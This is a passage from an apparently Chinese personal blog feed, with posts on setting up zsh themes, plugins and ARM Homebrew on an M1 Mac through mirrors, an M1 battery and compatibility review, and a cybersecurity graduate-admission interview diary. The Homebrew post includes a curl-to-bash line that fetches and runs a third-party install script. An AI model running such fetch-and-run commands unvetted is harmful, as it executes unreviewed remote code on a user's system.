href="%5Bhttps://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%5D(https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS">MesloLGS NF Bold.ttf</a> NF Bold.ttf)</li></ul><ol start="2"><li>brew install romkatv/powerlevel10k/powerlevel10k</li><li>echo “source $(brew –prefix)/opt/powerlevel10k/powerlevel10k.zsh-theme” &gt;&gt;~/.zshrc</li><li>p10k configure</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541913-5319b75a-dff9-46f5-9dd2-9e36c75d4c9d.png#crop=0&crop=0&crop=1&crop=1&id=gh3sH&originHeight=1266&originWidth=2000&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h1 id="安装-oh-my-zsh"><a href="#安装-oh-my-zsh" class="headerlink" title="安装 oh-my-zsh"></a>安装 oh-my-zsh</h1><p>上网搜一下官网，找到命令，安装即可。</p><blockquote><p>由于被墙，因此推荐国内镜像安装。</p></blockquote><p><a href="https://blog.csdn.net/qq_39530754/article/details/104714976">https://blog.csdn.net/qq_39530754/article/details/104714976</a><br>重新安装主题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Git">git clone --depth&#x3D;1 https:&#x2F;&#x2F;gitee.com&#x2F;romkatv&#x2F;powerlevel10k.git $&#123;ZSH_CUSTOM:-$HOME&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;themes&#x2F;powerlevel10k<br></code></pre></td></tr></table></figure><p>配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Git">vim ~.&#x2F;zshrc<br>修改<br>ZSH_THEME&#x3D;&quot;powerlevel10k&#x2F;powerlevel10k&quot;<br></code></pre></td></tr></table></figure><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Git">git clone https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions $&#123;ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;plugins&#x2F;zsh-autosuggestions<br>git clone https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-syntax-highlighting $&#123;ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;plugins&#x2F;zsh-syntax-highlighting<br></code></pre></td></tr></table></figure><p>如果暂时无法 clone，将网址替换成镜像地址再次尝试。</p><ul><li><a href="https://link.zhihu.com/?target=https://github.com.cnpmjs.org">github.com.cnpmjs.org</a></li><li><a href="https://link.zhihu.com/?target=https://hub.fastgit.org">https://hub.fastgit.org</a><blockquote><p>GitHub raw 域名并非 <a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a> 而是 <a href="https://link.zhihu.com/?target=http://raw.githubusercontent.com">http://raw.githubusercontent.com</a>，上方的 GitHub 加速如果不能加速这个域名，那么可以使用 Static CDN 提供的反代服务。<br>将 <a href="https://link.zhihu.com/?target=http://raw.githubusercontent.com">http://raw.githubusercontent.com</a> 替换为 <a href="https://link.zhihu.com/?target=http://raw.staticdn.net">http://raw.staticdn.net</a> 即可加速。</p></blockquote></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062542072-624b1beb-a718-460e-a69a-c5cff8ab8be2.png#crop=0&crop=0&crop=1&crop=1&id=rrLvh&originHeight=738&originWidth=1862&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写在前面，本文主要基于&lt;a href=&quot;https://f5soft.site/zh/notes/2021/0214/&quot;&gt;https://f5soft.site/zh/notes/2021/0214/&lt;/a&gt; 一文写成，用于记录安装过程中遇到的各种问题，便于日后快速复盘。&lt;</summary>
      
    
    
    
    <category term="mac" scheme="https://www.blog.hackerjerry.top/categories/mac/"/>
    
    <category term="m1" scheme="https://www.blog.hackerjerry.top/categories/mac/m1/"/>
    
    
    <category term="踩坑教程" scheme="https://www.blog.hackerjerry.top/tags/%E8%B8%A9%E5%9D%91%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>安装arm版Homebrew</title>
    <link href="https://www.blog.hackerjerry.top/2022/%E5%AE%89%E8%A3%85arm%E7%89%88Homebrew/"/>
    <id>https://www.blog.hackerjerry.top/2022/%E5%AE%89%E8%A3%85arm%E7%89%88Homebrew/</id>
    <published>2022-02-05T12:01:47.000Z</published>
    <updated>2022-02-07T10:05:52.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol><li><a href="https://www.bilibili.com/read/cv14064572">https://www.bilibili.com/read/cv14064572</a></li></ol><h1 id="实际安装"><a href="#实际安装" class="headerlink" title="实际安装"></a>实际安装</h1><p>第一步：设置中科大源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">HOMEBREW_CORE_GIT_REMOTE=https://mirrors.ustc.edu.cn/homebrew-core.git<br></code></pre></td></tr></table></figure><p>第二步：安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">/bin/bash -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install.sh)</span>&quot;</span><br></code></pre></td></tr></table></figure><p><img src="image/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%885.22.38.png#crop=0&crop=0&crop=1&crop=1&id=vhAiJ&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>第三步：添加配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">cd</span> ~<br>touch .zshrc<br>open -e .zshrc<br>复制进去<br><span class="hljs-built_in">export</span> PATH=/opt/homebrew/bin:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>最后更新一下配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">source</span> ~/.zshrc<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062507699-aaeeb80c-f3dc-4b2a-8a9d-35961a6382ea.png#crop=0&crop=0&crop=1&crop=1&id=rPzAA&originHeight=92&originWidth=1260&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>大功告成。最后，brew update 就好</p><h1 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment"># 替换brew.git</span><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(brew --repo)</span>&quot;</span><br>git remote <span class="hljs-built_in">set</span>-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git<br><span class="hljs-comment"># 替换homebrew-core.git</span><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core&quot;</span><br>git remote <span class="hljs-built_in">set</span>-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git<br><span class="hljs-comment"># 刷新源</span><br>brew update<br></code></pre></td></tr></table></figure><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p><a href="https://blog.csdn.net/liaowenxiong/article/details/119008586">https://blog.csdn.net/liaowenxiong/article/details/119008586</a><br>文章作者说 brew cask 已经集成到 brew 里面了，所以就不需要独立安装它了，但是！我安了之后还是显示 command not found，好迷啊。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;参考文献&quot;&gt;&lt;a href=&quot;#参考文献&quot; class=&quot;headerlink&quot; title=&quot;参考文献&quot;&gt;&lt;/a&gt;参考文献&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.bilibili.com/read/cv14064572&quot;&gt;https</summary>
      
    
    
    
    <category term="mac" scheme="https://www.blog.hackerjerry.top/categories/mac/"/>
    
    <category term="m1" scheme="https://www.blog.hackerjerry.top/categories/mac/m1/"/>
    
    
    <category term="踩坑教程" scheme="https://www.blog.hackerjerry.top/tags/%E8%B8%A9%E5%9D%91%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Mac air M1续航评测</title>
    <link href="https://www.blog.hackerjerry.top/2022/Mac%20air%20M1%E7%BB%AD%E8%88%AA%E8%AF%84%E6%B5%8B/"/>
    <id>https://www.blog.hackerjerry.top/2022/Mac%20air%20M1%E7%BB%AD%E8%88%AA%E8%AF%84%E6%B5%8B/</id>
    <published>2022-02-05T12:01:22.000Z</published>
    <updated>2022-02-07T10:05:52.988Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062482100-663433a4-687a-46eb-9b4b-216743eaf6f9.png#crop=0&crop=0&crop=1&crop=1&id=FL3cL&originHeight=828&originWidth=1260&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>新入手的评测记录。<br>前三天是不接电源测试续航极限，之后都是插着电源了。<br>说一下具体情况。<br>第一天，中午 12 点开机，到晚上 9 点左右，安装一些软件，看视频测试屏幕和音效，消耗大概 60%。<br>第二天，忘记了，应该也是一直下载安装软件，大概 80%耗电量。<br>第三天，高铁，下午 4 点到晚上 12 点，一直下东西，屏幕全亮 100%，耗电 90%。<br>可以看到，重度使用的情况下，大概就是 9 小时的续航。相比之下，游戏本 3 个小时的续航真的被完爆。<br>今天测试一下在写代码、写文档的场景下可以达到怎样的续航。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062482285-821d0dd8-0835-4178-b2b6-4c2975a8d0cb.png#crop=0&crop=0&crop=1&crop=1&id=NyeMw&originHeight=1020&originWidth=1336&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>写代码、看文档、听歌、看了一会视频、刷 b 站，耗电量如图，目测 10 小时续航无压力。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062482411-d9b955fc-261a-48c5-9e63-d7b123d41135.png#crop=0&crop=0&crop=1&crop=1&id=FCRXw&originHeight=1260&originWidth=1892&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>之前的图忘截了，就现弄了一张图，从图上来看，<br>国产软件对耗电普遍偏高，如 QQ、网易云音乐、wps 等。（特别是 wps，巨离谱，后台耗电大户，我都不敢开它）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062482100-663433a4-687a-46eb-9b4b-216743eaf6f9.png#crop=0&amp;crop=0&amp;crop=1&amp;crop</summary>
      
    
    
    
    <category term="mac" scheme="https://www.blog.hackerjerry.top/categories/mac/"/>
    
    <category term="m1" scheme="https://www.blog.hackerjerry.top/categories/mac/m1/"/>
    
    
    <category term="mac兼容性" scheme="https://www.blog.hackerjerry.top/tags/mac%E5%85%BC%E5%AE%B9%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>Mac air M1兼容测评</title>
    <link href="https://www.blog.hackerjerry.top/2022/Mac%20air%20M1%E5%85%BC%E5%AE%B9%E6%B5%8B%E8%AF%84/"/>
    <id>https://www.blog.hackerjerry.top/2022/Mac%20air%20M1%E5%85%BC%E5%AE%B9%E6%B5%8B%E8%AF%84/</id>
    <published>2022-02-05T04:06:39.000Z</published>
    <updated>2022-02-07T10:05:53.016Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644033998693-11ec739c-80af-4cd7-bfc1-213766e3895c.png#crop=0&crop=0&crop=1&crop=1&id=ibSkG&originHeight=926&originWidth=1406&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h1 id="win11-on-ARM"><a href="#win11-on-ARM" class="headerlink" title="win11 on ARM"></a>win11 on ARM</h1><p>完美运行，苹果第一适配厂 Microsoft 不是吹的。<br>在固态硬盘的加持下，虚拟机启动速度有了质的提高，大概在 5s 左右就可以恢复。<br>其中的大部分 x86 软件可以兼容运行，但是游戏类还是够呛。（又占内存又卡）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644033998889-c36de78a-5fd5-4d68-aba3-08b70ea6338c.png#crop=0&crop=0&crop=1&crop=1&id=pfDFR&originHeight=864&originWidth=1426&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>根据 b 站测评，守望先锋、古墓丽影等游戏可以运行，包括 steam 平台上的一部分游戏，但由于内存限制，运行起来并不流畅。<br>诸如原神、糖豆人，无法运行。</p><blockquote><p>本来我还想着去 appstore 下载游戏试试，但是,M1 根本就不适配，搜也搜不出来，苹果去年的时候就关闭了侧载应用，也就无法绕过 appstore 下载相关的 ipad 应用。</p></blockquote><h1 id="IDA-调试"><a href="#IDA-调试" class="headerlink" title="IDA 调试"></a>IDA 调试</h1><p>暂未测试<br>几篇参考文章可供日后测试：</p><ul><li><a href="https://weibo.com/ttarticle/p/show?id=2309404631273917251711#_loginLayer_1644031045386">https://weibo.com/ttarticle/p/show?id=2309404631273917251711#_loginLayer_1644031045386</a></li><li><a href="https://_bbs.pediy.com_thread-270804-1/">https://bbs.pediy.com/thread-270804-1.htm</a></li></ul><h1 id="安卓虚拟机测试"><a href="#安卓虚拟机测试" class="headerlink" title="安卓虚拟机测试"></a>安卓虚拟机测试</h1><p>暂未测试<br>但是想必一定是速度飞起，毕竟是原生 arm。</p><h1 id="x86-pwn-测试"><a href="#x86-pwn-测试" class="headerlink" title="x86 pwn 测试"></a>x86 pwn 测试</h1><p>暂未测试<br>暂时没想到啥好方法，不太清楚转译运行对内存寻址的影响。</p><ul><li><a href="https://www.its203.com/article/eeeeeight/121571831">https://www.its203.com/article/eeeeeight/121571831</a></li><li><a href="https://r888800009.github.io/software/security/binary/pwntools-mac-m1-install/">https://r888800009.github.io/software/security/binary/pwntools-mac-m1-install/</a></li></ul><p>根据网上的教程来看，不建议用 m1 来做 pwn。</p><h1 id="BUG-汇总"><a href="#BUG-汇总" class="headerlink" title="BUG 汇总"></a>BUG 汇总</h1><ol><li>如果我在 win11 里打开 wolai，然后在本机的 wolai 就会处于离线状态，而且关了之后打不开，必须把 pd 完全退出之后才能重新打开。</li><li>Safari 看 b 站的时候，经常就会吞鼠标，就是播放视频时，切换页面，这个时候鼠标就不见了，必须回到 b 站暂停才能让鼠标出现。这个 bug 可以稳定复现，出现频率非常高。</li><li>qq 手机发来的图片接收不到，离大谱。</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644063410079-7286054b-dcce-463c-98ae-8ed8d38c0509.png#clientId=ub774027b-c66c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=95&id=u2c7537a9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=190&originWidth=1048&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=27589&status=done&style=none&taskId=u3ecbedbe-0f7f-4814-a816-d0fd724fbd9&title=&width=524" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2022/png/1629942/1644033998693-11ec739c-80af-4cd7-bfc1-213766e3895c.png#crop=0&amp;crop=0&amp;crop=1&amp;crop</summary>
      
    
    
    
    <category term="mac" scheme="https://www.blog.hackerjerry.top/categories/mac/"/>
    
    <category term="m1" scheme="https://www.blog.hackerjerry.top/categories/mac/m1/"/>
    
    
    <category term="mac兼容性" scheme="https://www.blog.hackerjerry.top/tags/mac%E5%85%BC%E5%AE%B9%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>2021网安保研经验（西交+上科大+山大+上交+中科大）</title>
    <link href="https://www.blog.hackerjerry.top/2022/2021%E7%BD%91%E5%AE%89%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%EF%BC%88%E8%A5%BF%E4%BA%A4+%E4%B8%8A%E7%A7%91%E5%A4%A7+%E5%B1%B1%E5%A4%A7+%E4%B8%8A%E4%BA%A4+%E4%B8%AD%E7%A7%91%E5%A4%A7%EF%BC%89/"/>
    <id>https://www.blog.hackerjerry.top/2022/2021%E7%BD%91%E5%AE%89%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%EF%BC%88%E8%A5%BF%E4%BA%A4+%E4%B8%8A%E7%A7%91%E5%A4%A7+%E5%B1%B1%E5%A4%A7+%E4%B8%8A%E4%BA%A4+%E4%B8%AD%E7%A7%91%E5%A4%A7%EF%BC%89/</id>
    <published>2022-01-19T02:10:10.000Z</published>
    <updated>2022-02-07T10:05:53.228Z</updated>
    
    <content type="html"><![CDATA[<p>距离保研结束已经过去好几个月了，一直比较懒所以就没有整理保研的经验贴，今天教务处发了寒假安排，感觉要放假了，所以赶紧写出来给学弟学妹们看一下，从现在准备到夏令营完全来得及。<br>​</p><a id="more"></a><p>​</p><p>个人情况：西北某 211 信安专业<br>专业排名：10/155<br>保研综测排名：3/155<br>绩点：3.9/4.0<br>获奖情况：两次国家奖学金，美赛 M 奖，电子取证国一，数模国赛省一，互联网+省金，服创国二等<br>科研情况：无 paper<br>项目情况：都是比赛的项目<br>夏令营报名：西交网安、武大网安、华科 cs、上科大网安、山大网安、上交网安、中科大网安、南开网安、信工所<br>夏令营入营：西交（线上）、武大（线下冲突放弃）、上科大（线下）、山大（线上）、上交（线下）、中科大（线上）、信工所（放弃）<br>夏令营 offer：山大（学）、上交（专）、中科大（学）<br>预推免：哈深 cs（未入营）、浙大网安（入营后放弃）<br>最终去向：中科大<br>​</p><p>接下来逐个介绍一下。</p><h1 id="西交网安"><a href="#西交网安" class="headerlink" title="西交网安"></a>西交网安</h1><p>面试时间：6.21<br>夏令营入营 66 人，优营 15 人，不发 offer，预推免优先考虑（应该是考核指标加分）。<br>优营结果：未拿到<br>​</p><p>夏令营一天时间，上午 b 站宣讲，下午 3 点开始面试，一个人 10 分钟，双机位，共分成 3 个面试组。<br>自我介绍 5 分钟之内，然后老师问问题。<br>​</p><p>老师先问了我电子取证比赛干什么的？做了什么工作？用了什么工具？<br>​</p><p>又问了 无人机科研项目你们是提出了什么新的 idea 吗？你是负责人吗？你上面写撰写专业文档是写的什么？<br>​</p><p>然后又问了我 你还报了哪个夏令营？如果我们两个学校都给了你 offer 你会来哪里？为什么?<br>​</p><p>西交夏令营过程非常迷惑，发 offer 也是奇奇怪怪，明明这个“offer”是没有效力的（还需要重新参加九推），却只发了这么寥寥，我们学校网安强校也没有一个拿到属实没绷住，而且后面在知乎上了解到，西交九推又鸽了很多人，好感无，建议避雷。<br>​</p><blockquote><p>不过在西交的夏令营前，我给一个老师发了邮件，然后老师直接回复让我去面基，（大概 4 月份），当时我是属于啥都没准备就弄了个简历，然后就硬着头皮去了，不得不说，西交老校区梧桐树好多，很有年代的沧桑感。这次面基，老师对着成绩单和简历全程压力面，还现场写代码，给我涨了很多经验（虽然老师问的问题在之后的各种夏令营面试里一次也没有出现，但还是给了我一些自信心）。很感谢这位老师。</p></blockquote><h1 id="武大网安"><a href="#武大网安" class="headerlink" title="武大网安"></a>武大网安</h1><p>武大网安之前在网上看黑子挺多（主要是生活条件），然后这次还是线下（7.15 左右），和上交（线下）冲突，果断拒绝了。<br>​</p><p>听去的同学说，笔试考察了数据结构+网安基础，题目难度还是不小的。<br>​</p><p>不过做好去的准备之前最好去知乎了解一下，看看自己能不能忍受。（科研方面不是很了解，应该很不错）</p><h1 id="上科大信息学院"><a href="#上科大信息学院" class="headerlink" title="上科大信息学院"></a>上科大信息学院</h1><p>时间:7.6-7.8<br>夏令营分批入营，每一批大概 150 人左右<br>提供研究生公寓+104 元饭费<br>offer 结果：候补（拒绝）<br>​</p><p>简单讲一下面试过程，群面，四个老师，都是 PPT 里见过的，年纪不是很大感觉确实都依旧活跃在科研一线。<br>然后每个老师提问一门专业课，我的话是从项目经历里延申出的计算机网络+数据结构+高数+操作系统。<br>具体问题：</p><ol><li>你知道 tcp 中的 sequence number 吗？知道它每次建立链接之后，第一个序列号是怎么生成的？为什么要随机生成，防止什么攻击？</li><li>二叉树和哈希表都用来干什么的？</li><li>讲个泰勒展开吧（淦，高数好久都没复习了）</li><li>快表和页表的区别？</li></ol><p>​</p><p>由于刚刚忙完期末考就去夏令营了，还有好多都没复习好，面试答的也很一般，最后就收到了个候补的邮件，拒绝了。<br>​</p><p>y1s1，上科大的人文关怀还是很棒的，唯一的线下夏令营，体验不错！推荐去试试水，不过听说毕业要求很高（拿硕士当博士要求），所以存在延毕，慎重。</p><h1 id="山大网安"><a href="#山大网安" class="headerlink" title="山大网安"></a>山大网安</h1><p>时间 7.11<br>面试结果：学硕 offer<br>​</p><p>山大的面试是线上，第一天进行了一天的学术讲座，全都是密码学。。。真的难顶。<br>第二天上午面试，分了四个组。<br>进入面试间，很正规，老师们坐在一个大会议室里，估计投屏是我，距离隔得有点远，说话有一点点听不清。<br>首先是中文自我介绍，然后英语提问了一个问题，问我的很简单，能不能用英语介绍一下你的家乡（hhhh 老师看我是青岛人所以就挑了个简单的问），虽然我没准备，但还是用简单词汇流利的说出来了，毕竟夸自己家谁不会呢。<br>然后老师问，你学过密码学吧，说一个基于离散对数的密码方案吧。<br>答：国密 SM2<br>那你大致描述一下这个 SM2 的流程吧，简单介绍一下。<br>答：emmm，老师我记不清了。<br>老师说，那这么着吧，我们换一种问法，你说一种熟悉的密码算法吧。<br>答：RSA。<br>那你说一下 RSA 数字签名吧<br>巴拉巴拉<br>（不过当时我漏掉了哈希这个操作，导致老师一直问我，这里你用了什么哈希算法，不需要用哈希算法吗？老师可能有点无语，btw 老师就换了一个话题，你将来准备从事哪一方面的研究。<br>接着换了一个老师，问，你计算机方面学过什么课程？<br>我就随便说了几门<br>然后他问，你对哪一门课掌握的最好。<br>我说 操作系统吧<br>然后问，那你说一下死锁吧<br>答：几个进程之间由于获取资源之后都没有即使释放，而等待其他进程释放被占用资源造成的阻塞现象叫死锁。如果没有外力作用，它们将无法推进下去。<br>问产生死锁的必要条件有哪些？<br>然后你说一下进程和线程的区别。<br>答：进程是资源分配的最小实体，线程是运行调度的最小单位。<br>进程包含线程。<br>最后一个问题，数字签名能否用于加密方案？<br>我说，不可以。。。然后解释了一通。<br>老师说不对，你回去考虑考虑。<br>​</p><p>总结：入营 150+？不过看群里那些学校一般般，最后给了 60 左右的优营？还是蛮简单的。而且山大网安在青岛，看了一下确实离海边很近，可冲。</p><h1 id="华科-cs"><a href="#华科-cs" class="headerlink" title="华科 cs"></a>华科 cs</h1><p>没入营，竞争还是很激烈的。我们专业只进了 rank1。<br>高中基友 985rank3 也进了，可见本科出身还是很重要的。<br>据 rank1 说，华科网安她也进了，但是主办方安排很混乱仓促，于是鸽了。<br>​</p><p>然后，线上面试，应该正常发挥就可以，她被要求写了一个很简单的代码。<br>然后他们都拿到 offer 了，获取比例大概 70%。</p><h1 id="南开网安"><a href="#南开网安" class="headerlink" title="南开网安"></a>南开网安</h1><p>我们学校没有入的，应该是入营直接卡 211，建议 211 的学弟学妹以后不必白费力气。</p><h1 id="信工所"><a href="#信工所" class="headerlink" title="信工所"></a>信工所</h1><p>信工所战线拉得很长，也是好几批，听说信工所是点击就送的，然鹅第一批我没有入营。（7.8 左右出通知）<br>​</p><p>同专业另外的几个同学入营了，有排名前的也有排名后的，反正就是很迷惑。<br>​</p><p>然后过了好几天，从上交回校的时候，三室、五室、六室轮番打电话问要不要考虑（我猜是没招满，直接拿报名名单一个一个找（也真是辛苦）），上来就是“同学，那个你现在有 offer 吗”，笑死。<br>​</p><p>然后我当时说可以试一下（毕竟线上），然后他说给我报上了，注意邮箱。但是我等了好几天都没看见来信，我就把这事忘了，后来整理邮箱的时候，在垃圾箱里发现了信工所的材料提交邮件。。。看了一下好麻烦，要交不少东西，算了算了，估计当时给我发我也不会弄的。<br>​</p><p>整体来说，信工所属于给钱多，活杂，读硕体验一般的学校。国重是早早就满了，实力很强，竞争也很激烈。如果有志于读博，那我唯一推荐国重的老师。如果想读硕士，三思，知乎上多查查。<br>​</p><h1 id="上交网安"><a href="#上交网安" class="headerlink" title="上交网安"></a>上交网安</h1><p>入营：100（学硕+专硕）<br>据不可靠消息，学硕只给了 10 个名额给外校的<br>最终结果：拿到专硕 offer<br>（同专业大佬拿到了学硕 offer，🍋）</p><h2 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h2><p>非常非常坑了。。。由于去年疫情的缘故，上交没有笔试，直接面试。所以当时上岸的学姐给我们透露的是，2019 年夏令营是英文选择题，基本上都是黑皮网安基础上的内容。<br>​</p><p>好家伙，我们就一直疯狂复习那本书（虽然刚学完）。<br>​</p><p>结果试卷发下来，傻眼了。<br>​</p><p>两部分，一部分网安基础，非常开放的题，比如 apt，蜜罐，银行业务，https 怎么保证安全。<br>​</p><p>第二部分网安数基，你猜怎么着，它认为的数学基础不是密码学群论和近世代数，而是概率论和线性代数！<br>考了极限中心定理、泊松分布和二次型，好家伙，一个都没复习。一首凉凉献上。<br>​</p><p>凭借着残存的记忆默写对了泊松分布的公式，中心定理直接胡答了，二次型直接手撕（最后也没撕出来）。<br>总之就是非常迷惑，说好的英语呢？说好的黑皮呢？说好的 ipsec 呢？</p><h2 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h2><p>群面，20 分钟，老师非常 nice。<br>​</p><p>面我的老师有谷大武院长，从头到尾只问了我的项目，一点专业课都没有问。<br>​</p><p>大都是表面问题，比如指标之类的，少部分考察项目思考的问题由谷大武老师提出，然后出来之后和小伙伴讨论的时候认为这次面试体验还不错。他们遇到的老师有的英语发音含含糊糊，听不清楚问的什么，有的老师怼了他好几个专业问题，总之感觉谷大武老师组非常和气，体验很好。<br>​</p><p>唯一一点要注意的就是，你英文自我介绍完之后，老师会用英语再提问你几个问题，虽然我都能听懂，但是表达还是比较磕绊（没提前准备）。不过老师很和善，加上我的发音不错，感觉没啥大问题。</p><h2 id="推荐的科研团队"><a href="#推荐的科研团队" class="headerlink" title="推荐的科研团队"></a>推荐的科研团队</h2><p><strong>密码与计算机安全实验室(LoCCS)-谷大武</strong><br>实验室老师很多，我觉得实力很强，交大的 Ooop 战队应该就是他们组里的吧？<br>研究方向包括：</p><ul><li>密码学</li><li>软件安全</li><li>硬件安全</li><li>网络安全</li></ul><p><strong>密码分析与大数据安全实验室-邱卫东</strong><br>研究方向包括：</p><ul><li>密码分析/密码工程</li><li>图像视频多媒体智能化分析/自然场景文本处理技术</li><li>AI 安全与隐私保护</li><li>金融大数据分析</li><li>互联网测量技术</li></ul><p>老师较少，但方向不错。</p><h1 id="中科大网安"><a href="#中科大网安" class="headerlink" title="中科大网安"></a>中科大网安</h1><p>时间：7.20-23 线上<br>入营：90~100<br>结果：获得 offer，根据之后学校抄送的邮件来看，大概有 70 个左右的优营，可以说点击就送（bushi<br>​</p><p>中科大是最早发布夏令营信息的，大概 4 月？就一整个长跑，老拖着你反正。也是除了绿裙之外唯一一个公开夏令营交流群的大学，前期差不多每个群 2000+。<br>​</p><p>然后前期也在一直宣传，又是实验室开放日（线上），又是宣讲的，还邮寄了参营大礼包（印着 USTC 的小书包！超可爱，文化衫，本子笔），参与感满满，点赞。<br>​</p><p>然后就是线上面试，咋说呢，一言难尽。感觉虎头蛇尾的。<br>入营很难，然后优营水水就能拿。面试上午一次，下午一次，不同的老师，唯一不同就是上午要英文自我介绍。然后提的问题也挺简单的（虽然同住的小伙伴被问到的问题有点离谱，反正很开放，老师看你运用知识的能力）<br>最迷惑的是，发了这么多优营，结果联系所有老师都说满了，非常离谱，一度让我产生没有学上了的错觉，然后我就放弃继续联系导师了。<br>​</p><p>然后就开始九推准备了（这期间上交和中科大结果都没出来）<br>​</p><p>8 月 13 号？上交突然发来邮件说我拿到优营了，贼开心反正，因为我进当时她发的一个会议链接（里面都是优营），大概就 40 人，估计 20 学硕 20 专硕。<br>​</p><p>然后过了几天，中科大我导给我发邮件，说研究方向很合适现在有名额要不要来，我当时被上交优营的喜悦冲昏了头脑，就直接没回。<br>​</p><p>后来，经过谨慎的思考，我觉得还是学硕比较适合我，（几天后）我联系我导，他说他名额满了，但可以给我推荐，然后推荐到实验室大老板那了，面了一个小时收了。<br><strong>​</strong></p><p><strong>至此，夏令营结束。</strong></p><h1 id="哈深-CS"><a href="#哈深-CS" class="headerlink" title="哈深 CS"></a>哈深 CS</h1><p>哈深也是分好几批，从 8.20 开始一直到 9.3<br>线上<br>​</p><p>我联系的挺早，那个老师也加我微信电话聊了聊，然后我就投了等待入营。<br>结果？四批入营始终也没收到入营邮件，离了个大谱，rank2 没入营，基友也没入营，搞不懂哈深怎么个筛选机制。<br>​</p><p>总之来说，建议去知乎上多搜搜，哈深不做太多评价。</p><h1 id="浙大网安"><a 